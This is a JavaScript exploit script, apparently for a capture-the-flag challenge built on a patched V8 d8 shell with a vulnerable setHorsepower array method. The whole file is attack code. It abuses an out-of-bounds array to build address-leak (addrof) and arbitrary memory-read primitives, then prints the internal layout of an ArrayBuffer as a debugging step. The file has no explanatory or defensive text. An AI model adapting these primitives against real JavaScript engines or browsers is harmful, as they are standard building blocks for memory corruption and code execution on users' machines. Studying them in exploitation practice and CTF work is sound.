// Debug DH: inspect ArrayBuffer layout
var buf = new ArrayBuffer(8);
var f64buf = new Float64Array(buf);
var u64buf = new Uint32Array(buf);
function ftoi(val, size) {
	f64buf[0] = val;
	if(size == 32) { return BigInt(u64buf[0]); }
	else { return BigInt(u64buf[0]) + (BigInt(u64buf[1]) << 32n); }
}
function itof(val, size) {
	if(size == 32) { u64buf[0] = Number(val & 0xffffffffn); }
	else { u64buf[0] = Number(val & 0xffffffffn); u64buf[1] = Number(val >> 32n); }
	return f64buf[0];
}
function addrof(obj){
	obj_arr[0] = obj;
	return ftoi(oob_arr[19],64) >> 32n;
}
function aar(addr){
	high = ftoi(oob_arr[40], 64) & 0xffffffff00000000n;
	oob_arr[40] = itof((BigInt(addr)-8n) + high, 64);
	return ftoi(double_arr[0],64);
}

var oob_arr = [1.1, 2.2, 3.3, 4.4].setHorsepower(0x100);
var obj_arr = [{a:1}, {b:1}];
var double_arr = [1.1, 2.2, 3.3, 4.4];

var target_buffer = new ArrayBuffer(0x500);
var dataview = new DataView(target_buffer);
var tb = addrof(target_buffer);
print("[+] target_buffer: 0x" + tb.toString(16));
for (let i = 0; i < 10; i++) {
  let off = BigInt(i*8);
  print("  +0x" + off.toString(16) + ": 0x" + aar(tb + off).toString(16));
}
